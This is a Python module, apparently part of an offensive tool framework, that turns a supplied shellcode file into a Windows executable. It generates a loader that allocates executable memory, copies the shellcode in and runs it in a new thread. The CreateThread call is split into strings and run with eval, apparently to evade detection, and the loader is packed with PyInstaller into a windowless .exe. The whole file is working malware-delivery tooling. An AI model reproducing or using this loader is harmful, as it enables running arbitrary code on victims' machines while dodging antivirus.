import os
import time
import random
import shutil
from module import Moduleobject

class exe_options(Moduleobject):
    def __init__(self,ui):
        super(exe_options,self).__init__()
        self.ui=ui
        ui.banner()
        self.values={'source':'',
                     'outfile':'%s'%(time.strftime('%m%Y')+str(random.randint(0,100))+'.exe'),
                     'noconsole':False,
                     }
        self.read_code = r''
        self.outfile_dirpath = './output/'

    def script_code(self,shellcode):
        return ('''
import ctypes
    
code = ("%s")

a = "ctypes.windll.kernel32.Creat"
b = "eThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))"
            
ptr = ctypes.windll.kernel32.VirtualAlloc(0, 4096, ctypes.c_int(0x1000), ctypes.c_int(0x40))
ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),ctypes.c_int(len(code)))
byte = bytearray()
byte.extend(map(ord,code))
buffer = (ctypes.c_char * len(code)).from_buffer(byte)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buffer, ctypes.c_int(len(code)))
ht = eval(a+b)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))'''%shellcode)

    def read_shellcode(self,filename):
        with open (filename,'r') as shellcode:
            print('\033[92m' + '[*]' + '\033[0m''------> shellcode recorded <------')
            return str(shellcode.read())

    def write_script(self,code):
        output_script_name = self.outfile_dirpath+self.values['outfile']+'.py'
        with open (output_script_name,'w') as code_write:
            code_write.write(self.script_code(shellcode=code))
        print('\033[92m' + '[*]' + '\033[0m' + 'script was created succesfully ! ! ',end='\n')

    def generate_exe(self):
        if os.path.isfile(self.outfile_dirpath+self.values["outfile"]+".py"):
            if self.values["noconsole"] == False:
                command = 'cd output;pyinstaller %s.py --noup --onefile --clean;cd ..'%self.values["outfile"]
            else:
                command = 'cd output;pyinstaller %s.py --noup --onefile --noconsole --clean;cd ..'%(self.values["outfile"])
            os.system(command)
            print('\033[92m'+'[*]'+'\033[0m'+'binary file was created succesfully ! ! ')


    def docker_pack(self,file):
        try:
            os.makedirs("./output/src")
        except FileExistsError:
            print("src is exist, ")
        shutil.move("./output/%s.spec"%file,"./output/src/")
        shutil.copy("./output/%s.py"%file,"./output/src/")
        os.system('cd output;cd src;docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows:python3-32bit;cd ..;cd ..')
        shutil.copy("./output/src/dist/windows/%s"%file,"./output/")
        shutil.rmtree('./output/src')
        print('\033[92m' + '[*]' + '\033[0m' + 'exe file was created succesfully ! ! ')

    def clean_cache(self,file):
        shutil.rmtree('./output/build')
        shutil.rmtree('./output/dist')
        print('\033[92m' + '[*]' + '\033[0m' +"cache was cleaned")

    def run_action(self):
        self.read_code = self.read_shellcode(self.values['source'])
        time.sleep(2)
        self.write_script(code=self.read_code)
        time.sleep(2)
        print('-' * 50)
        self.generate_exe()
        time.sleep(1)
        self.docker_pack(self.values["outfile"])
        time.sleep(2)
        self.clean_cache(self.values['outfile'])
        input('type any key to continue')
